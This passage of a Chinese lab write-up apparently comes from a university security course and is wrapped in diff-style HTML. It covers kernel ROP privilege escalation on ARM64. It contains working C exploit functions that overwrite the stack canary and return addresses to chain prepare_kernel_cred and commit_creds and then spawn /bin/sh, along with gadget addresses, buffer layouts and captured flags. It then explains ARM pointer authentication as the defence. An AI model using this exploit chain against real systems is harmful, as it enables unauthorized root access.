+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">hackUsingFirstLevelGadget&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;0123456789ABCDEF&lt;/span>&lt;span class="se">\x30&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">newRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAToFirstLevelGadget&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">oldFPStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">40&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">newRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230529215904015.png"
+width="429"
+height="275"
+srcset="https://unicocn.github.io/p/rop/image-20230529215904015_hue72d13ea232307be7b98e6e1d90b8e06_14839_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230529215904015_hue72d13ea232307be7b98e6e1d90b8e06_14839_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 7"
+class="gallery-image"
+data-flex-grow="156"
+data-flex-basis="374px"
+>&lt;/p>
+&lt;p>flag：sysde655sEc&lt;/p>
+&lt;h2 id="task3-rop-获取-root-权限">Task3: ROP 获取 root 权限&lt;/h2>
+&lt;ol>
+&lt;li>这次我们需要使用ROP进行提权，函数调用栈为&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">zjubof_write4&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="n">zjubof_write3&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prepare_kernel_cred&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">commit_creds&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">second_level_gadget&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">into&lt;/span> &lt;span class="nl">zjubof_write3&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">32&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">leave&lt;/span> &lt;span class="nl">zjubof_write3&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">32&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">into&lt;/span> &lt;span class="nl">prepare_kernel_cred&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">32&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">leave&lt;/span> &lt;span class="nl">prepare_kernel_cred&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">32&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">into&lt;/span> &lt;span class="nl">commit_creds&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">48&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">leave&lt;/span> &lt;span class="nl">commit_creds&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">48&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">into&lt;/span> &lt;span class="nl">second_level_gadget&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">leave&lt;/span> &lt;span class="nl">second_level_gadget&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sp&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">464&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="2">
+&lt;li>根据函数调用栈，得到栈布局&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530014157017.png"
+width="885"
+height="1139"
+srcset="https://unicocn.github.io/p/rop/image-20230530014157017_hu4a1d69c8930bbac0ac62fe299df7bf06_175373_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530014157017_hu4a1d69c8930bbac0ac62fe299df7bf06_175373_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 8"
+class="gallery-image"
+data-flex-grow="77"
+data-flex-basis="186px"
+>&lt;/p>
+&lt;ol start="3">
+&lt;li>构造buffer如下&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">160&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">160&lt;/span> &lt;span class="n">B&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">24&lt;/span> &lt;span class="p">...&lt;/span> &lt;span class="mi">30&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">canary&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">40&lt;/span> &lt;span class="p">...&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RA&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">prepare_kernel_cred&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">72&lt;/span> &lt;span class="p">...&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RA&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">commit_creds&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">104&lt;/span> &lt;span class="p">...&lt;/span> &lt;span class="mi">112&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RA&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">second_level_gadget&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">152&lt;/span> &lt;span class="p">...&lt;/span> &lt;span class="mi">160&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RA&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">zjubof_write&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>各个ROP的跳转地址分别为：&lt;/p>
+&lt;p>RA of prepare_kernel_cred: 0xffff8000100a6214&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530014732806.png"
+width="679"
+height="301"
+srcset="https://unicocn.github.io/p/rop/image-20230530014732806_hudc7f838a89b5fe1b3ffdc4bcaac19c78_52123_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530014732806_hudc7f838a89b5fe1b3ffdc4bcaac19c78_52123_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 9"
+class="gallery-image"
+data-flex-grow="225"
+data-flex-basis="541px"
+>&lt;/p>
+&lt;p>RA of commit_creds: 0xffff8000100a5f6c&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530014820517.png"
+width="690"
+height="298"
+srcset="https://unicocn.github.io/p/rop/image-20230530014820517_hu1e291eaad6f027d7cb99a8904b45b093_48571_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530014820517_hu1e291eaad6f027d7cb99a8904b45b093_48571_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 10"
+class="gallery-image"
+data-flex-grow="231"
+data-flex-basis="555px"
+>&lt;/p>
+&lt;p>RA of second_level_gadget: 0xffff8000107abdb0（因为第一条指令不改变sp，因此可以直接跳 ）&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530014929574.png"
+width="559"
+height="138"
+srcset="https://unicocn.github.io/p/rop/image-20230530014929574_hu1e227605a560464adff1d70b820cdcb3_12118_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530014929574_hu1e227605a560464adff1d70b820cdcb3_12118_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 11"
+class="gallery-image"
+data-flex-grow="405"
+data-flex-basis="972px"
+>&lt;/p>
+&lt;p>RA of zjubof_write: 0xffff8000107abe54&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530015026018.png"
+width="641"
+height="228"
+srcset="https://unicocn.github.io/p/rop/image-20230530015026018_hube20c14d19f4606e445fc5155efa7ce2_39065_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530015026018_hube20c14d19f4606e445fc5155efa7ce2_39065_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 12"
+class="gallery-image"
+data-flex-grow="281"
+data-flex-basis="674px"
+>&lt;/p>
+&lt;ol start="4">
+&lt;li>关键代码及结果&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">hackUsingROP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">161&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">canaryStr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">prepareKernelCredRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfPrepareKernelCred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">40&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">prepareKernelCredRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">commitCredsRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfCommitCreds&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">72&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">commitCredsRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">secondLevelGadgetRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfSecondLevelGadget&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">104&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">secondLevelGadgetRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">ZJUBofWriteRA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">RAOfZJUBofWrite&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">152&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ZJUBofWriteRA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">160&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530012657947.png"
+width="419"
+height="277"
+srcset="https://unicocn.github.io/p/rop/image-20230530012657947_hu9b906c3777cccf150df819fa48544bad_14826_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530012657947_hu9b906c3777cccf150df819fa48544bad_14826_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 13"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="363px"
+>&lt;/p>
+&lt;p>flag：sysde655sEc&lt;/p>
+&lt;h2 id="task4-linux内核对-rop-攻击的防护">Task4: Linux内核对 ROP 攻击的防护&lt;/h2>
+&lt;ol>
+&lt;li>编译运行，之后执行exp&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 编译内核&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">ARCH&lt;/span>&lt;span class="o">=&lt;/span>arm64
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CROSS_COMPILE&lt;/span>&lt;span class="o">=&lt;/span>aarch64-linux-gnu- defconfig
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CROSS_COMPILE&lt;/span>&lt;span class="o">=&lt;/span>aarch64-linux-gnu- menuconfig
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CROSS_COMPILE&lt;/span>&lt;span class="o">=&lt;/span>aarch64-linux-gnu- -j&lt;span class="k">$(&lt;/span>nproc&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 将vmlinux精简成Image&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aarch64-linux-gnu-objcopy -O binary vmlinux Image --strip-all
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./start.sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>发现出现段错误&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530191216896.png"
+width="599"
+height="960"
+srcset="https://unicocn.github.io/p/rop/image-20230530191216896_hue0db8aec13802586289bcf9a826fefc3_58948_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530191216896_hue0db8aec13802586289bcf9a826fefc3_58948_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 14"
+class="gallery-image"
+data-flex-grow="62"
+data-flex-basis="149px"
+>&lt;/p>
+&lt;ol start="2">
+&lt;li>查看汇编代码，发现相比之前多了&lt;code>paciasp&lt;/code>和&lt;code>autiasp&lt;/code>这两个指令&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530191355426.png"
+width="704"
+height="920"
+srcset="https://unicocn.github.io/p/rop/image-20230530191355426_hu80b22562d138cbf17922264dfeb87403_156375_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530191355426_hu80b22562d138cbf17922264dfeb87403_156375_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 15"
+class="gallery-image"
+data-flex-grow="76"
+data-flex-basis="183px"
+>&lt;/p>
+&lt;p>这两个指令由ARM PA机制引入，这是一种指针认证的方式。其通过在存储指针之前向未使用的高位添加加密签名来工作，这也被称为指针认证码（PAC）。&lt;code>paciasp&lt;/code>用于在存储指针值之前生成并插入指针认证代码（PAC），而&lt;code>autiasp&lt;/code>则用于在从内存读回后验证并删除指针值中的PAC。这种机制可以保证在写入和读取指针之间对指针值的任何更改都会使签名无效，进而CPU会将身份验证失败解释为内存损坏，并设置指针中的高位，使该指针无效并导致应用程序崩溃。&lt;/p>
+&lt;p>&lt;img src="https://unicocn.github.io/p/rop/image-20230530183831260.png"
+width="982"
+height="317"
+srcset="https://unicocn.github.io/p/rop/image-20230530183831260_hu094ed7f3d136e8e32b06af09533db3cc_132358_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/rop/image-20230530183831260_hu094ed7f3d136e8e32b06af09533db3cc_132358_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 16"
+class="gallery-image"
+data-flex-grow="309"
+data-flex-basis="743px"
+>&lt;/p>
+&lt;p>总结来说，在进入函数的时候，栈上存储的不再是返回地址，而是附带着加密后的返回地址，在离开函数时会校验这个地址的合法性，如果合法即未被篡改函数才能正常返回；同时由于攻击者无法得知密钥以及加密算法，因此攻击者无法构造出加密后的返回地址进行&lt;code>buffer overflow&lt;/code>，也就无法进行 ROP 攻击&lt;/p>
+&lt;h2 id="思考题">思考题&lt;/h2>
+&lt;ol>
+&lt;li>为什么linux canary的最低位byte总是 &lt;code>\00&lt;/code>？&lt;/li>
+&lt;/ol>
+&lt;p>保证内存对齐，可以提高内存访问效率；同时可以将其当做字符串的终止符，防止canary的泄露&lt;/p>
+&lt;ol start="2">
